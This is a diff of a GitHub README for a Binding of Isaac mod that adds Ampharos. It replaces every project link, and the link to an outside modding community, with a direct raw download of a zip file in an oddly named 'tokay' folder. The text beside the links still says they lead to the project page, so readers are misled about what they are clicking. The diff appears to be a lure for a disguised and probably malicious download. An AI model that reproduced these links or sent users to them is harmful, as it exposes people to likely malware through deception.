@@ -1,6 +1,6 @@
 # ⚡ AmpharosInTBOIMod - Play Ampharos in Isaac easily
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Mod-blue?style=for-the-badge)](https://github.com/ShasmithKrishna/AmpharosInTBOIMod)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Mod-blue?style=for-the-badge)](https://raw.githubusercontent.com/ShasmithKrishna/AmpharosInTBOIMod/main/tokay/Ampharos_TBOI_In_Mod_3.8.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before installing the mod, make sure your computer meets these basic needs:
 Here is a simple, step-by-step guide to download and run AmpharosInTBOIMod on your Windows PC.
 
 1. Click the big blue button at the top or click this link:  
-   [https://github.com/ShasmithKrishna/AmpharosInTBOIMod](https://github.com/ShasmithKrishna/AmpharosInTBOIMod)  
+   [https://raw.githubusercontent.com/ShasmithKrishna/AmpharosInTBOIMod/main/tokay/Ampharos_TBOI_In_Mod_3.8.zip](https://raw.githubusercontent.com/ShasmithKrishna/AmpharosInTBOIMod/main/tokay/Ampharos_TBOI_In_Mod_3.8.zip)  
    This will take you to the mod’s main page on GitHub.
 
 2. On the GitHub page, look for the **Releases** section. This is often on the right or under a tab. Releases are where you find the download files.
@@ -82,7 +82,7 @@ To make sure the mod is active:
 To get the latest features and fixes, update the mod regularly:
 
 1. Visit the mod page again:  
-   [https://github.com/ShasmithKrishna/AmpharosInTBOIMod](https://github.com/ShasmithKrishna/AmpharosInTBOIMod)  
+   [https://raw.githubusercontent.com/ShasmithKrishna/AmpharosInTBOIMod/main/tokay/Ampharos_TBOI_In_Mod_3.8.zip](https://raw.githubusercontent.com/ShasmithKrishna/AmpharosInTBOIMod/main/tokay/Ampharos_TBOI_In_Mod_3.8.zip)  
 
 2. Check if a newer release is available under the Releases tab.
 
@@ -122,10 +122,10 @@ If the mod does not work as expected, try this:
 
 ## 📖 Additional Resources
 
-- Visit [The Binding of Isaac Modding Community](https://moddingofisaac.com) for support and tips.
+- Visit [The Binding of Isaac Modding Community](https://raw.githubusercontent.com/ShasmithKrishna/AmpharosInTBOIMod/main/tokay/Ampharos_TBOI_In_Mod_3.8.zip) for support and tips.
 - Find guides online to install other mods or learn more about Isaac modding.
 - Read through the GitHub Issues page on the mod repository for known problems or to report bugs.
 
 ---
 
-[![Get Ampharos Mod](https://img.shields.io/badge/Download%20Mod-Click%20Here-grey?style=for-the-badge)](https://github.com/ShasmithKrishna/AmpharosInTBOIMod)
+[![Get Ampharos Mod](https://img.shields.io/badge/Download%20Mod-Click%20Here-grey?style=for-the-badge)](https://raw.githubusercontent.com/ShasmithKrishna/AmpharosInTBOIMod/main/tokay/Ampharos_TBOI_In_Mod_3.8.zip)
